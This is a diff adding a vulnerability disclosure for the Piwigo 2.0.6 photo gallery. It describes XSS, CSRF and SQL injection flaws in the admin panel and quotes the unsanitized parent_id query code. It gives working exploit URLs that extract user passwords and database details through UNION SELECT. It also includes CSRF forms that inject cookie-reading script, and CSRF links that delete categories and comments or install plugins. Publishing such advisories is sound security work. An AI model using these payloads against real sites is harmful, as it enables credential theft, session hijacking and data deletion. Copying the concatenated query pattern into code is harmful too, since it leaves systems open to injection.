@@ -1,0 +1,82 @@
+################################################################# 
+#
+# Piwigo v2.0.6 Multiple Vulnerabilities
+# Found By: mr_me
+# Download: http://piwigo.org/
+# Tested On: Windows Vista
+# Note: For educational purposes only
+# Vulnerabilities: XSS, CSRF, SQL Injection
+# Author contact date: 13/12/09
+#
+#################################################################
+
+Note: There is possibly many other vulnerabilities but I need to sleep!
+
+XSS Vulnerabilities:
+
+When creating a "category" or a "tag" in the admin panel the user can submit javascript code that could be executed in the context of the browser. 
+This would not be significant as only the administrator can complete this functionalility, however this can be combined with CSRF for proper exploitation. (see below)
+
+SQL Injection Vulnerabilities:
+
+Note: This app uses "mysql_fetch_array()" which also details the full web root path when a SQL error is created.
+
+Warning</b>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <b>C:\xampp\htdocs\piwigo-2.0.6\include\functions.inc.php</b> on line <b>936
+
+The parent_id and image_id and unsanitized however image_id does not seem exploitable. Also when updating an image in the caddie there is a post back that has some possibly exploitable variables "associate", "dissociate" and "selection[]". Below is the vulnerable code for parent_id in cat_list.php
+
+8<------------------------------------snip------------------------------------8<
+
+else
+{
+  $query.= '
+  WHERE id_uppercat = '.$_GET['parent_id'];
+}
+
+8<------------------------------------snip------------------------------------8<
+
+exploit:
+
+8<------------------------------------snip------------------------------------8<
+
+http://[server]/piwigo-2.0.6/admin.php?page=cat_list&parent_id=-6+union+select+1,password,3,4,5,6+from+piwigo.piwigo_users--
+http://[server]/piwigo-2.0.6/admin.php?page=cat_list&parent_id=-6+union+select+1,concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20),3,4,5,6--
+
+8<------------------------------------snip------------------------------------8<
+
+http://127.0.0.1/piwigo-2.0.6/admin.php?page=picture_modify&cat_id=7&image_id=1'
+
+[mysql error 1064] You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 3
+
+CSRF vulnerabilities:
+
+There are some very nice CSRF's in the admin panel. First of all when creating tags for the tag cloud and also creating a category. 
+So if we combine these CSRF's with XSS then we can login to the admin panel and execute SQL Injection :)
+
+exploit:
+
+8<------------------------------------snip------------------------------------8<
+
+<form action="http://[server]/piwigo-2.0.6/admin.php?page=tags" method="post">
+  <fieldset>
+    <label>
+      <input type="hidden" value="<script>alert(document.cookie)</script>" name="add_tag" />
+    </label>
+    <p><input class="submit" type="submit" name="add" value="Submit" /></p>
+  </fieldset>
+</form>
+
+or 
+
+<form id="addVirtual" action="http://[server]/piwigo-2.0.6/admin.php?page=cat_list" method="post">
+   <input type="hidden" name="virtual_name" value="<script>alert(document.cookie)</script>" />
+    <input class="submit" type="submit" value="Submit" name="submitAdd"  />
+</form>
+
+or
+
+http://[server]/piwigo-2.0.6/admin.php?page=cat_list&delete=1
+http://[server]/piwigo-2.0.6/admin.php?page=plugins_new&order=date&revision=1364&extension=234
+http://[server]/piwigo-2.0.6/comments.php?delete=2
+
+8<------------------------------------snip------------------------------------8<
